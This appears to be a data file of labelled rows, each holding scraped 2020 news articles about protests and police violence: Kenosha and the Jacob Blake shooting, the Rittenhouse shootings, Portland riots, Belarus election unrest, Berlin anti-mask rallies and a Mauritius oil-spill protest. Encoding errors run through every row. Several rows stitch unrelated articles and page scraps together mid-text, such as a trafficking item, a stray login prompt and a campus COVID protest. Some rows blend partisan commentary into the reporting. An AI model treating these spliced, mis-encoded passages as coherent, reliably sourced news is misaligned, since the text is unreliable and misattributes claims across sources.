1,"On Wednesday, former President Barack Obama praised the NBAâ€™s Milwaukee Bucks for refusing to take the court for a game, which led the league to postpone all three of the nightâ€™s playoff contests.

Jacob Blake, 29, was shot several times in the back by Kenosha Police Department officers in front of his children on August 23 following a domestic violence call. Kenosha police officers were responding to a domestic incident near 28th Avenue and 40th Street around 5:11 p.m, according to a statement from the Wisconsin Attorney General. Jacob was trying to break up a fight between two women when he was tased and then shot by police, The Kenosha News reported. In a graphic video posted on social media, two officers are seen following Jacob to a gray van with their weapons drawn. As Jacob enters the vehicle, one of the officers is seen grabbing and pulling on Jacobâ€™s shirt and shoots multiple shots into his back. A woman in the video is seen frantically screaming and jumping up and down following the shooting. The 29-year-old was sent to Froedtert Hospital in Milwaukee in serious condition, according to The Kenosha News. NBA Agent and Jacobâ€™s childhood friend, Daniel Poneman, wrote on Twitter that Jacob was out of surgery and currently in the ICU fighting for his life. â€œHe is out of surgery and in the ICU. He can make it through this. He is fighting for his life. Please please please pray for Jacob Blake,â€ Poneman wrote. https://twitter.com/DanielPoneman/status/1297750493498941441 The attorney general stated that the Wisconsin Department of Justice (DOJ), Division of Criminal Investigation (DCI), is investigating the shooting and the officers involved were placed on administrative leave as of August 24. Following the shooting, demonstrators gathered outside the scene of the shooting to protest, WDJT-TV reported. The city of Kenosha issued a city-wide curfew until 7 a.m. on August 24 because of the protests. ""It goes back to the Emmett Tills. We're tired of it. Rodney King. We're tired of it. And right now, this is the wrong generation that this is happening to. The frustration is boiling to the top and we're sick and tired,"" said Clyde McLemore, founder of Black Lives Matter of Lake County, Illinois, told the news station. The shooting comes just days after the fatal police shooting of Trayford Pellerin in Louisiana and anti-racism protests following multiple police-involved deaths. Who is Jacob? Civil rights attorney Benjamin Crump, who is representing Jacob and his family, posted on Twitter that he is a father whose three sons witnessed the shooting while sitting in the backseat of the vehicle Jacob was trying to enter. â€œJacob Blakeâ€™s 3 SONS were IN THE CAR he was getting into when @KenoshaPolice shot him tonight. They saw a cop shoot their father. They will be traumatized forever. We cannot let officers violate their duty to PROTECT us. Our kids deserve better!!â€ Crump wrote. https://twitter.com/AttorneyCrump/status/1297741652568805377?s=20 Wisconsin Governor Tony Evers said in a statement that he is calling for some empathy from elected officials â€œin our state who have failed to recognize the racism in our state and our country for far too long.â€ â€œWe stand with all those who have and continue to demand justice, equity, and accountability for Black lives in our countryâ€”lives like those of George Floyd, of Breonna Taylor, Tony Robinson, Dontre Hamilton, Ernest Lacy, and Sylville Smith. And we stand against excessive use of force and immediate escalation when engaging with Black Wisconsinites,â€ the statement read. Jeffery Robinson, the director of the American Civil Liberties Unionâ€™s (ACLU) Trone Center for Justice and Equality, called the shooting â€œanother vicious act of police violence caught on camera.â€ â€œUnfortunately, disgusting acts of police brutality like this will be commonplace so long as police continue to act as an occupying force in Black communities,â€ Robinson said in a statement to The North Star. â€œIt should now be clear to elected officials across the country that the only way to end the scourge of police violence is to immediately divest from a policing institution that, from its inception, has been used to oppress Black people, and reinvest into the same communities that those horrific acts of violence are regularly perpetrated against. Policing is a crisis in and of itself, and we can no longer throw money and resources at an institution as hopelessly broken and expect to get different results.â€ For your security, we need to re-authenticate you.

Text to Speech CNN -- the network where Brian Stelter preaches that the Republicans and Fox News are guilty of ""asymmetric lying"" -- was dramatically bending reality in the 5 am hour on Tuesday. On Early Start, they went live to correspondent Omar Jimenez, who described the images of buildings ablaze as being in â€œstark contrastâ€ to the events going on in the daylight, â€œwhich were largely peaceful demonstrations.â€ The chyron was unbelievable: ""FIERY BUT MOSTLY PEACEFUL PROTESTS AFTER POLICE SHOOTING"". Before turning to Jimenez, co-host Laura ""daughter of Valerie"" Jarrett explained ""There were protests in several other cities yesterday as well, most of them peaceful, although an officer was attacked with a cane in San Diego."" OMAR JIMENEZ, CNN CORRESPONDENT: Christine and Laura, what you're seeing is one of multiple locations that have been burning in Kenosha, Wisconsin, over the course of the night, a second night since Jacob Blake was seen shot in the back seven times by a police officer. And what you are seeing now, these images came in stark contrast to what we saw over the course of the daytime hours in Kenosha and into the early evening, which were largely peaceful demonstrations in the face of law enforcement. It wasn't until night fall that things begun to get a little bit more contentious. Things were thrown back and forth. Police started using some of those crowd dispersal tactics like tear gas, even playing really loud sounds to push them. And then what you're seeing, a common theme that ties all of this together is an expression of anger and frustration over what people feel really like has become an all too familiar story playing out in places from across the country not just here in Kenosha, Wisconsin -- Christine, Laura. Jimenez is the 26-year-old CNN reporter who was wrongly arrested by police in Minneapolis during the George Floyd-spurred rioting. CNN then turned that mistake into an ad about their own heroic riot coverage. As Tristan Justice at The Federalist noted, Jimenez was also the reporter on scene on Monday's Situation Room where the CNN chyron was briefly accurate -- â€œ8PM Curfew Ordered After Violent Protests Over Police Shooting Of Unarmed Black Man In Wisconsinâ€ -- until they nixed the V-word after a few seconds. This early-morning Jimenez segment immediately caused most conservatives to recall a similar mind-bending incident by MSNBC's Ali Velshi in Minneapolis on the Lyin' Brian Williams show in May, saying â€œthis isâ€¦ mostly a protest...It is not, generally speaking, unruly.â€  The mission of the Media Research Center is to create a media culture in America where truth and liberty flourish.

Amy Furr/Breitbart News Human trafficking is a supply and demand business, according to Unbound Fort Worth, a local organization dedicated to helping survivors and resourcing the community to fight the problem. â€œSupporting the commercial sex industry, whether by viewing pornography or purchasing sex, creates profit for traffickers. End the demand, and we end trafficking,â€ the site read. Event organizer Lathina Finder echoed Jamesâ€™ statement and said, because the issue was out in the open, â€œItâ€™s up to us to stop it.â€ â€œBecause obviously our legislatures and our Congress and all them are not going to.

1,"Advertisement  A group of â€˜peacefulâ€™ BLM-Antifa â€˜protestersâ€™ marched to Seattle police chief Carmen Bestâ€™s Snohomish County home this week. The police chief didnâ€™t want these â€˜peaceful protestersâ€™ in her yard, so she wrote a letter to the City Council instructing them to â€œforcefully call for the end of these tactics.â€ Advertisement - story continues below Itâ€™s all fun and games to the radical left-wing officials until the militants show up to their home.

Residents blocked a road into Bestâ€™s neighborhood, according to the letter and posts on social media from that evening. Multiple posts that appeared to come from Bestâ€™s neighbors referred to protesters as â€œterrorists,â€ and at least one included a photo of a gun. Advertisement - story continues below Bestâ€™s letter said her neighbors â€œwere concerned by such a large groupâ€ and didnâ€™t allow protesters to â€œtrespass or engage in other illegal behavior in the area, despite repeated attempts to do so.â€ She didnâ€™t elaborate on the behavior in question but wrote that the Snohomish County sheriff was â€œmonitoring the situation.â€ Snohomish County Sheriff Adam Fortney said most of the protesters were dispersing or had already left when deputies arrived. He said he spoke with Best, who was not at home at the time, on the phone and â€œassured her that the Snohomish County Sheriffâ€™s Office would deploy whatever resources were necessary to protect her, her family and her property.â€ Bestâ€™s neighbors werenâ€™t in the mood to host malcontents protesting in their neighborhood. Armed residents confronted the protesters and the exchange further confirmed why the 2nd Amendment is essential for our protection and to ensure our freedoms. â€œWe are peaceful!

1,"Three vehicles, a black school bus, bread truck and tan minivan were stopped by Kenosha police Wednesday evening, Aug. 26 after police said officers suspected the occupants were preparing for criminal activity related to the civil unrest. KENOSHA, Wis. - Three vehicles, a black school bus, bread truck and tan minivan were stopped by Kenosha police Wednesday evening, Aug. 26 after police said officers suspected the occupants ""were preparing for criminal activity related to the civil unrest."" This, on the fourth night of protests following the police shooting of Jacob Blake, and a night after two people were fatally shot during demonstrations. Police said this began with a citizen tip that the vehicles planned to meet in a remote lot near State Highway 50 and Green Bay Road. Officers began surveilling the vehicles after locating them, assisted by U.S. Marshals -- and confirmed the out-of-state plates. Police said officers followed them to a gas station near Washington Road and 30th Avenue, where officers observed the occupants of the bus and bread truck exit and attempt to fill multiple fuel cans. Credit: Jenna Sykora At this point, ""suspecting that the occupants of these vehicles were preparing for criminal activity related to the civil unrest,"" officers attempted to make contact and investigate. Police noted, ""the officers exited their vehicles, identified themselves, were wearing appropriate identification and then detained the occupants of the bus and bread truck."" The driver of the minivan tried to pull away, but the vehicle was stopped and police forced entry -- arresting the occupants. According to police, the vehicles contained various items that included helmets, gas masks, protective vests, illegal fireworks and suspected controlled substances. The nine individuals were arrested for disorderly conduct and are pending charging decisions by the Kenosha County district attorney. â€œJacob did nothing to provoke police. He was a great father and was only intending to get his children out of a volatile situation. Witnesses confirm that he was not in possession of a knife and didnâ€™t threaten officers in any way,"" Benjamin Crump said in a statement Thursday on the shooting of Jacob Blake by Kenosha police. Investigators havenâ€™t explained why police drew guns on Blake and why the officer opened fire. They say a knife was found in the SUV, but they have said nothing about what role it may have played. Advertisement According to a news release from the ACLU, Sheriff Bethâ€™s deputies ""not only fraternized with white supremacist counter-protesters on Tuesday but allowed the shooter to leave as people yelled that he was the shooter.""

Conservative journalist Andy Ngo said some protesters in Portland are calling themselves â€˜pressâ€™ while throwing objects at police officers. People who purportedly identified themselves as â€œPRESSâ€ on their clothing during the ongoing protests in Portland were seen throwing objects at law enforcement officers during demonstrations-turned-riots overnight, according to a reporter on the ground. Andy Ngo, editor-at-large of The Post Millennial, tweeted late Wednesday local time that protesters from the crowd of demonstrators â€œthrowing projectiles at officersâ€ included people who had marked themselves as â€œPRESS.â€ The person who captured the video that Ngo shared, who identified themselves as part of a â€œpress collective in PDX,â€ did not include any information on their own Twitter page about ""press"" allegedly throwing the items. The video also shows someone pointing a large green laser at the officers. A mattress lit on fire during riots in Portland. PORTLAND POLICE DECLARE RIOT AT ICE BUILDING Portland has endured more than 80 nights of increasingly violent and destructive demonstrations that have at times devolved into riots. Itâ€™s also not the first time people who had identified themselves as being members of the press have allegedly acted out. Late Saturday into Sunday morning, police said people who identified themselves as â€œpressâ€ threw objects at police. Two officers went to the hospital after being injured by flying objects, which included a 9.5-pound rock, police said. FIRE SET INSIDE PORTLAND'S MULTNOMAH BUILDING DURING UNREST, RIOT DECLARED A day before, police said â€œseveral people with â€˜pressâ€™ affixed to them shined flashlights in officers eyes.â€ At the beginning of the month, people with â€œpressâ€ markings repeatedly threw objects at police, the Portland Police Bureau reported. On Wednesday night, authorities declared a riot at a Portland protest outside an Immigration and Customs Enforcement building. People spray painted windows on the building, used traffic cones to block security cameras, and tried to break windows, the Oregonian/OregonLive reported. PORTLAND ATTACK VICTIM SAYS HE TRIED TO STOP ROBBERY: 'THEY WOULDN'T LET ME GET UP' Demonstrations in which fires have been set, objects have been thrown and police have fired â€œcrowd control munitionsâ€ have gripped Oregonâ€™s biggest city for more than two months following the police-involved death of George Floyd in Minneapolis. Floyd, a Black man who was handcuffed, died after a white police officer held his knee on his neck for nearly nine minutes despite Floydâ€™s repeated shouts that he could not breathe.

1,"A Florida teacher responded to her districtâ€™s plans to reopen for in-person classes during the coronavirus pandemic by writing her own obituary. Whitney Reddick, who teaches special education in Jacksonville, Florida, posted the mock death notice to Facebook Aug. 4. In it, she proclaims that she died â€œwhile alone in isolation and on a ventilator at a Duval county hospitalâ€ last week at age 33. â€œEven though she shouted from the rooftops, attempted to be unemotional, and educated herself in facts and science, she succumbed to the ignorance of those in power,â€ the obituary reads. â€œShe returned to work, did her best to handle all the roles placed on her shoulders; educator, COVID-security guard, human shield, firefighter, social worker, nurse, and caregiver but the workload weakened her, and the virus took hold.â€ â€œWhitney was taken from us,â€ it continues. â€œYes, of course too soon, but we are the ones left with holes in our hearts, missing how big hers was.â€ Mourners are then encouraged to send â€œcondolencesâ€ to Florida Gov. Ron DeSantis (R), Jacksonville Mayor Lenny Curry (R) and the Duval County school board and superintendent. According to its website, Duval County public schools are slated to reopen next Thursday with both in-person and remote learning options for students. Though Reddick said in an interview sheâ€™ll return to her classroom as scheduled, she added that sheâ€™d prefer her district keep classes for all students remote, given that coronavirus cases in Florida continue to surge. â€œI felt the gravity of the situation and the obit took that on,â€ she told â€œThe Today Showâ€ last week. She said that in the debate over reopening schools, educators â€œno longer became people who had families and loved ones, we became a tool in restarting an economy. I wanted it to hit home that teachers are people and have families and loved ones.â€ And Reddick, the mother of a 1-year-old boy, said sheâ€™s mostly concerned about what would happen to her family if she were to contract COVID-19. â€œI love my job so much,â€ she told CBS Jacksonville. â€œWhat if I go on a ventilator? What if my husband gets sick? ... Who takes care of our son? What if I pass away? What if he passes away?â€ In an email, Duval County Superintendent Diana Greene told HuffPost she and her staff planned to â€œrise to the challengeâ€ of teaching amid the pandemic. â€œTeaching is a public service, but it is unlikely any of us thought about a long-term global pandemic when we chose this path to serve children,â€ she said. â€œI empathize with the fears some teachers have expressed, and I also empathize with the needs of 130,000 children and their families.â€ â€œWith the resources and guidance available to us, we must move forward with every feasible precaution to support our employees and to serve those students who need us in classrooms,â€ she added. As of Thursday, more than 550,901 cases of coronavirus had been confirmed in Florida. The state had a testing positivity rate of 13.45%, according to Johns Hopkins University. The universityâ€™s statistics on Thursday showed almost 9,000 deaths in Florida attributed to the coronavirus, fifth-most in the U.S."
1,"By Ariel Zilber and Rachel Sharp For Dailymail.com and Associated Press Published: 08:48 EDT, 29 August 2020 | Updated: 12:00 EDT, 29 August 2020  1.1k View comments  One of the two protesters fatally shot in Kenosha, Wisconsin, on Tuesday night by a 17-year-old vigilante gunman from Illinois was filmed taunting a group of armed individuals moments before he was killed. â€˜Shoot me, n*****,â€™ 36-year-old Kenosha resident Joseph Rosenbaum is heard saying in the video in which he is seen confronting several armed men during the unrest that followed last Sunday's police shooting of 29-year-old black man Jacob Blake. One of the armed men wearing a black baseball cap and what appears to be tactical gear on his body then turns around and takes a few steps toward Rosenbaum. He then walks past Rosenbaum without incident. Kyle Rittenhouse, of Antioch, Illinois, has been charged with fatally shooting Rosenbaum and 26-year-old Anthony Huber and wounding a third - Gaige Grosskreutz, 26. Rittenhouse shot one of his victims five times including in the head, the criminal complaint reveals - but his attorney has claimed it was he who was 'attacked' and insisted he was acting in self-defense. Rittenhouse's attorney Lin Wood said the 17-year-old vigilante was 'attacked' with 'lethal force' and 'had the right to defend himself' when he shot dead the two Black Lives Matter protesters and injured a third man, Grosskreutz. Joseph Rosenbaum, 36, one of two people killed during unrest in Kenosha, Wisconsin, on Tuesday night, was filmed shortly before his death taunting a group of armed individuals. Rosenbaum is seen on the right in the reddish-brown t-shirt â€˜Shoot me, n*****,â€™ the 36-year-old Rosenbaum is heard saying in the video in which he is seen confronting several armed men One of the armed men wearing a black baseball cap (left) and what appears to be tactical gear on his body then turns around and takes a few steps toward Rosenbaum Attorneys representing Rittenhouse have said he acted to defend himself. Kenosha County prosecutors said in court records this week that Rosenbaum was the first person Rittenhouse shot at around 11:45pm on Tuesday. Prosecutors said Rosenbaum followed Rittenhouse into a used car lot, where he threw a plastic bag at the gunman and attempted to take the weapon from him. The medical examiner found that Rosenbaum was shot in the groin, back and left hand. The wounds fractured his pelvis and perforated his right lung and liver. He also suffered a superficial wound to his left thigh and a graze wound to his forehead. The two men who were killed were Rosenbaum, 36, of Kenosha, (left) and Anthony Huber, 26, of Silver Lake, (right) about 15 miles west of the city. Huber's devastated girlfriend broke her silence over his 'murder' Friday, saying her 'heroic' boyfriend died trying to save the lives of her and other protesters Rosenbaum, 36, of Kenosha, pictured with his fiancÃ©e and a young daughter, died Tuesday evening Gaige Grosskreutz (left) - the suspected killer's third and only surviving victim is pictured in hospital recovering after the shooting. On right is his left arm where he was shot Grosskreutz pictured clutching his bloodied arm after Rittenhouse shot him at close range Tuesday night Grosskreutz getting medical attention after the shooting. Grosskreutz, aged 26, was legally permitted to be carrying his handgun. Rittenhouse meanwhile is 17 and so was illegally carrying the AR-15 rifle he used to shoot Grosskreutz and the two other victims Friends have told local media that Rosenbaum was originally from Texas and previously lived in Arizona before moving to Wisconsin this year, where his young daughter lives. According to his Facebook page, he worked at a Wendy's restaurant in Kenosha. Rosenbaum is survived by a fiancee and a young daughter. â€˜May you forever be with the angels and rest easy bro. I love you!â€™ his sister wrote on Facebook. After shooting Rosenbaum, Rittenhouse then ran down the street and was chased by several people shouting that he just shot someone, before he tripped and fell, according to the complaint and video footage. Huber, of Silver Lake, Wisconsin, was shot in the chest after apparently trying to wrestle the gun away from Rittenhouse, the complaint said. Hannah Gittings, Huber's girlfriend, told WBBM-TV that he pushed her out of the way before chasing after the man others on the street had identified as the shooter. Huberâ€™s friends gathered at a Kenosha skate park this week to remember him and his passion for skateboarding. According to court records, Huber had a skateboard in his right hand and used it to â€˜make contactâ€™ with Rittenhouseâ€™s left shoulder as they struggled for control of the gun. Other protesters remembered Huber on Wednesday night near the spot where he was shot, and Gittings told the group that he was an amazing person. Kyle Rittenhouse, 17, has been charged with first degree intentional homicide following the shooting death of two protesters in Kenosha on Tuesday. Social media photos show the teen had a strong admiration for law enforcement and guns Much of Rittenhouse's Facebook is devoted to praising law enforcement, with references to Blue Lives Matter - the movement that supports police. He also previously participated in a youth public safety cadet program (pictured), according to social media â€˜He took down an armed gunman with nothing but his (profanity) skateboard,â€™ Gittings said, according to the Chicago Tribune. The Kenosha News reported that local protest organizers said both Rosenbaum and Huber had participated in demonstrations this spring and summer, beginning with the May death of George Floyd after a Minnesota police officer pressed his knee into the handcuffed man's neck. â€˜They came out here every time with us,â€™ said Porche Bennett, a Kenosha resident who has organized protests. â€˜Sweet. Loving. They were the sweetest hearts, souls. I called Anthony my hippie guy. They were sweet guys.â€™ Bennett said she was particularly grateful to Huber, who stood in front of her when authorities used tear gas during protests outside the Kenosha County Courthouse this week. According to court records, Huber has a criminal record that includes several arrests for battery, drugs and other charges. At the time of his death, Rosenbaum had an open criminal case on battery, disorderly conduct and domestic abuse charges. The third man to be shot was wounded in the left arm. Court records said Grosskreutz appeared to be holding a gun when he approached Rittenhouse after he shot at Huber. Grosskreutz is an activist who volunteered as a medic during the Kenosha demonstrations, according to Milwaukee activist Bethany Crevensten. Jacob Blake (pictured) was shot seven times in the back by a cop in front of his three young children Sunday. Outrage is building over the cops' response to white teen Rittenhouse compared to black man Blake The image above shows the moment a Kenosha, Wisconsin, police officer fired at least seven shots into the back of Jacob Blake as he was getting into an SUV in a residential neighborhood The images above show the moments leading up to the shooting. Blake (seen in the white shirt) walks away from a police officer who has his gun drawn She said Grosskreutz was part of a group of roughly two dozen activists who have demonstrated around Milwaukee in the wake of Floydâ€™s death and went to Kenosha to protest. Grosskreutz, who was wearing a backpack and cap labeled â€˜paramedic,â€™ was shot in the arm, Crevensten said. â€˜He was a hero and he is a hero,â€™ she said. Grosskreutz, of West Allis, was recovering after surgery and was not yet giving interviews, Crevensten said this week. The Milwaukee Journal Sentinel reported that Grosskreutz is a senior at Northland College in Ashland and the college registrar's office said he is set to graduate in December. Kyle Rittenhouse's (pictured Tuesday night) attorney has claimed he was 'attacked' and was acting in self-defense when he shot dead two unarmed Black Lives Matter protesters and injured a third man in the streets of Kenosha Tuesday night, as new video reveals a different angle to one of the attacks The video shows the vigilante shooting his third and only surviving victim Gaige Grosskreutz in the arm as the 26-year-old was carrying a handgun. This came moments after Rittenhouse fatally shot Joseph Rosenbaum, 36, of Kenosha, and Anthony Huber, 26, and called a friend to say 'I've killed someone' Grosskreutz is armed with a handgun in his right hand and appears to come towards Rittenhouse. Rittenhouse opens fire at Grosskreutz at close range shooting him in the left arm. Wisconsin is an open carry state, meaning people aged 18 and over are legally allowed to carry a gun. Grosskreutz is over 18, Rittenhouse is not A grab of Rittenhouse's extradition hearing on Friday morning. He did not show his face The paper also reported that he previously worked as a special events coordinator, wilderness medical instructor and sea kayak guide at Lost Creek Adventures in Cornucopia, according to an online LinkedIn profile. The company offers kayak tours, rentals and programs on wilderness skills within the Apostle Islands National Lakeshore. Rittenhouse, a police-obsessed Donald Trump supporter, appeared before a judge briefly on a Zoom call on Friday. His extradition hearing has been pushed back another month. He will return to court on September 25. The teen is faced with murder charges while outrage builds nationwide over the different treatment by cops of the white armed teen compared to their treatment of Blake. Rittenhouse faces five felony charges that include first-degree intentional homicide and first-degree reckless homicide, and a misdemeanor charge for possession of a dangerous weapon by a minor.

Share This Story Amnesty International is urging law enforcement to reform its policing policies, after identifying 125 human rights violations during the Black Lives Matter protests. On Tuesday, the organization released a report in which it documented alleged abuses committed by federal, state, and local police officers between May 26 and June 5 across 40 states. After analyzing police responses to the demonstrations sparked by George Floyd's death, Amnesty concluded that law enforcement had violated people's rights to peaceful assembly through the use of intimidation and violence. The organization specifically noted the use of tear gas, smoke, and percussion grenades, which were not only used against protestors, but also bystanders and journalists. Per the report: Using heavy-duty riot gear and military-grade weapons and equipment to police largely peaceful demonstrations intimidates protesters exercising their right to peaceful assembly. Equipping officers in a manner more appropriate for a battlefield may put them in the mindset that confrontation and conflict are inevitable rather than possible and may escalate tensions between protesters and police ... As seen in many countries, inappropriate or excessive police interventions can actually lead to violence and disorder rather than reducing tensions. Indeed, police will have a propensity to use the weaponry they are deployed with and so should not be deployed with weapons that are inherently inappropriate for the operation they are conducting. Amnesty also launched an interactive map that marked instances of police violence during the demonstrations. The map was a result of an extensive investigation that included the analysis of 500 videos and photos posted on social media as well as consultation with weapons and law enforcement experts. In some of these cases, Amnesty was able to interview the victims and confirm police conduct with local authorities. Related Stories STORY CONTINUES BELOW ""The analysis is clear: When activists and supporters of the Black Lives Matter movement took to the streets in cities and towns across the USA to peacefully demand an end to systemic racism and police violence, they were overwhelmingly met with a militarized response and more police violence,"" said Brian Castner, senior crisis advisor on Arms and Military Operations at Amnesty International. ""The time for applying band-aids and making excuses for a few â€˜bad applesâ€™ has passed."" Amnesty is calling on federal, state, and local officials to make sweeping changes to the way law enforcement responds to protests. The organization has urged lawmakers to limit the use of lethal force and ""ensure that everyone under their jurisdiction can enjoy their human rights to peaceful assembly and freedom of expression."" Amnesty has also demanded each law enforcement agency to revise the policing policies in accordance with international human rights standards, including those laid out in the UN Code of Conduct for Law Enforcement Officials. ""Whatâ€™s needed now is systemic, root-and-branch reform of US policing that brings an end to the scourge of police use of excessive force and extrajudicial executions of Black people,"" Castner said. ""Communities should not live in fear of being harmed by the very officers that have sworn an oath to protect them. Officers responsible for excessive force and unlawful killings must always be held accountable."" Join the conversation on Complex today! Share This Story"
1,"Demonstrators set a Portland, Oregon, police precinct on fire Sunday evening as the event was declared a riot by the law enforcement agency. On Monday morning, the Portland Police Department released a statement along with footage of the unrest that erupted several hours prior. According to the police departmentâ€™s statement, a crowd of approximately 200 protesters gathered in the streets of Portland late Sunday evening at around 9:41 p.m. Shortly after the gathering began, it intensified to protests, and â€œsomeone lit a canopy against the building on fire.â€ The law enforcement agency detailed how the fire erupted. â€œThe fire began to burn to the siding of the building, so officers on the roof got a fire extinguisher to try and put it out. As they were putting out the fire, multiple people pelted the officers with rocks,â€ the statement read. â€œA lieutenant was struck with a chunk of ceramic, causing a cut to his hand. A second awning was also lit on fire close to a tree. That caused damage before it was extinguished.â€  Amid the precinct fire, the police department detailed a number of other incidents that occurred on Sunday evening. According to the department, the majority of participants wore â€œarmor, helmets, gas masks, all-black clothing, and carried shields.â€ The statement also indicated that the riot began when a dumpster was set on fire and pushed into an intersection. Law enforcement officials also claim the burning dumpster was used to shield to protect rioters as they hurled multiple objects at officers including: â€œAlmost immediately, from behind the shields and elsewhere, individuals began throwing chunks of ceramic, rocks, and glass bottles in the direction of the officers. Green lasers, which are capable of causing permanent eye damage, were shined at officers.

1,"Authoritarian Alexander Lukashenko has won another term - but there are concerns that the election was not run fairly. Monday 10 August 2020 10:24, UK Please use Chrome browser for a more accessible video player Police and protesters have clashed in the capital of Belarus and other cities after a contested presidential election which saw the country's long-time leader secure a landslide victory. Alexander Lukashenko, who has ruled for 26 years, won the election with 80% of the vote, the election commission said - according to preliminary results. However, there is widespread suspicion that the election was not fair, with two opposition candidates denied places on the ballot before one of them was jailed and the other fled to Russia.  On Monday morning Reuters reported that at least one person was killed and 120 protesters had been detained, citing the Viasna human rights group. Many were injured in clashes with riot police who were deployed on the streets to disperse protesters. ""It was a peaceful protest, we weren't using force,"" said 23-year-old protester Pavel Konoplyanik, helping a friend to hospital who had a plastic grenade fragment stuck in his neck. ""No one will believe in the official results of the vote, they have stolen our victory."" The main opposition candidate, Sviatlana Tsikhanouskaya, was targeted during the weekend: eight members of her staff were arrested and one of her aides fled the country. Ms Tsikhanouskaya, a former teacher and wife of a jailed opposition blogger, had received large displays of support leading up to the election - unusual in a country where dissent is rarely tolerated. But opposition supporters said they expected election officials would manipulate the election results in favour of Mr Lukashenko. After the vote on Sunday, thousands of protesters gathered in Minsk where police used truncheons to beat them and flash-bang grenades in an effort to get them to leave. Protesters tried to build barricades with rubbish bins. There were also demonstrations in the cities of Brest, Gomel, Grodno and Vitebsk and police fired tear gas at people in Brest, according to news reports. Please use Chrome browser for a more accessible video player Please use Chrome browser for a more accessible video player It is unclear how many people were injured or arrested but the Association Press quoted Ales Bilyatsky of Viasna as saying there had been several hundred arrests. Among them were three journalists from an independent Russian TV station and an AP journalist was beaten by police and taken to hospital. But for some voters, Lukashenko's long, hard-line rule was a plus. ""He is an experienced politician, not a housewife who appeared out of nowhere and muddied the waters,"" said retiree Igor Rozhov. ""We need a strong hand that will not allow riots."" Please use Chrome browser for a more accessible video player Meanwhile, Ms Tsikhanouskaya said she did not believe the polls, saying: ""I will believe with my own eyes. The majority was for us."" After voting earlier in the day, she had said: ""I hope that everything will be peaceful and that the police will not use force."" As he voted, Mr Lukashenko had said: ""Do you want to try to overthrow the government, break something, wound, offend, and expect me or someone to kneel in front of you and kiss them and the sand onto which you wandered? This will not happen."" Please use Chrome browser for a more accessible video player Mr Lukashenko has been in power since July 1994 but many have become frustrated with his authoritarian rule, the struggling economy and his failure to recognise the seriousness of the coronavirus pandemic. He has dismissed the illness as ""psychosis"" and advised people to ""drink vodka"" and ""go to saunas"" to ward off the virus. Two weeks ago, the 65-year-old said he had caught COVID-19 and recovered ""on his feet"" without showing any symptoms.  He has not brought in any restrictions to limit the spread of the virus, despite more than 68,500 confirmed cases and 580 deaths - numbers that critics say are manipulated. Ms Tsikhanouskaya tapped into this frustration as she campaigned across the former Soviet country of 9.5 million people.

1,"In-depth reporting, data and actionable intelligence for policy professionals â€“ all in one place.      Demonstrators ignore hygiene rules to rally in German capital. Thousands of people, packed close together and not wearing face masks, protested in Berlin on Saturday against official measures intended to curb the spread of the coronavirus. Police said they would file charges against the organizer of the gathering as demonstrators had not followed hygiene rules such as maintaining social distancing or wearing a mask covering nose and mouth. Some 17,000 people took part in the demonstration at its peak, according to police. The gathering was organized with the title ""The end of the pandemic â€” day of freedom."" Some demonstrators chanted ""the biggest conspiracy theory is the pandemic,"" according to German media reports. A Stuttgart-based organization called Querdenken 711 â€” which roughly translates as ""thinking outside the box 711"" â€” organized the rally. The interior minister for the city of Berlin, Andreas Geisel, said on Friday that neo-Nazi organizations had also called for people to participate in the march. German media outlets noted that ""Day of Freedom"" was also the name of a Nazi propaganda film documenting the party's 1935 party congress in Nuremberg. One banner at the march called for politicians such as German Health Minister Jens Spahn, Bavaria's state premier Markus SÃ¶der, Chancellor Angela Merkel and leading virologist Christian Drosten to be ""locked away."" Protesters also ""aggressively asked"" journalists to remove their masks by protestors, newspaper Der Tagesspiegel reported. A video by Querdenken 711 before the march said the group was peaceful and called on attendees to be polite to journalists. Sawsan Chebli, a senior official in the Berlin city government, called the protest ""a disaster."" ""I just came from abroad and see these pictures. Many look to Germany, and admire us for how we have dealt with corona. Such pictures are a disaster. They destroy everything. They endanger human lives and destroy livelihoods. They scare me,"" she tweeted. â€˜I donâ€™t want to do without it,â€™ the German ex-chancellor said about the popular sausage dish. With infection numbers on the rise, Berlin braces for the fall. Head of Oxford Vaccine Group says vaccination wonâ€™t stop spread altogether. Spokesperson maintains there was â€˜no wrongdoingâ€™ on behalf of the former British PM.

1,"Discover Thomson Reuters By Giulia Paravicini 2 Min Read (Reuters) - Thousands of protesters demonstrated in the Mauritius capital Port Louis on Saturday to demand an investigation into an oil spill from a Japanese ship and the mysterious death of at least 40 dolphins that have been found near the site of the spill. Environmentalists have called for an investigation into whether the dolphins died as a result of the spill caused when the bulk carrier, the MV Wakashio, struck a coral reef last month. One protestor held a banner with a dolphin covered in oil reading â€œour lives matterâ€ and another held one calling for the government to resign. Mauritian flags were waved across the packed square of St Louis Cathedral. â€œWe do not trust the government and the diluted information theyâ€™ve been feeding us regarding the management and responses to the oil spill,â€ Fabiola Monty, 33 a Mauritian environmental scientist, told Reuters from the square. The government has said it will carry out autopsies on all the dead dolphins and has set up a commission to look into the oil spill. Two investigations are being carried out: one by the police on the crewâ€™s responsibilities and one by a senior Shipping Ministry official on what happened to the ship. So far veterinarians have examined only two of the mammalsâ€™ carcasses, which bore signs of injury but no trace of oil in their bodies, according to preliminary autopsy results. The autopsy on the first two was conducted by the government-run Albion Fisheries Research Centre. Autopsy results on 25 dolphins that washed ashore Wednesday and Thursday are expected in the coming days, according to Jasvin Sok Appadu from the Fisheries Ministry. Local environmental group Eco-Sud, which took part in Saturdayâ€™s protest, said in a statement on Friday that representatives from civil society should be present during the autopsies and called for a second opinion from independent specialists.

Older adults are typically more prone to severe coronavirus infections, although individuals with weakened immune systems are also at high risk. The demonstrators have a list of demands corresponding to the protest, including petitions for more COVID-19 testing and offering faculty members the liberty to teach remotely. Currently, faculty must seek permission from the school to teach remote online courses. The group submitted a petition with 1,002 signatures along with the list of demands to an employee in the administration building. Graduate student Bryant Barnes said the school's current testing plans would not be enough to accommodate consistently testing all students and employees. Sujata Iyengar, a professor at the school since 1998 who joined protesters, said she thinks university officials ""have not thought this through,"" adding that more classes should be held outside rather than indoors, where the virus spreads more easily. ""We have affirmatively addressed the core of these concerns through our comprehensive planning over the summer,"" the school said in the statement, adding that the university has committed $250,000 for emergency funds to aid students who have critical and sudden financial emergencies.

